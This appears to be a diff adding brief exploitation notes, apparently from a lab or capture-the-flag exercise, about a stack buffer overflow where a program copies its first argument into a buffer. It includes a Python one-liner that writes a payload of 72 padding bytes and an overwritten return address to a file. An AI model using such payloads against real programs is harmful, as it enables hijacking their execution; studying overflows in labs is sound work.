@@ -1,0 +1,6 @@
+We observe that $1 is copy into a buffer malloc on the stack ?
+
+Warning : the exact buffer seems to change due to machine-dependent padding !?
+
+python -c 'print "A"*72 + "\x54\x84\x04\x08"' | tr -d "\n" > /tmp/mypayload
+
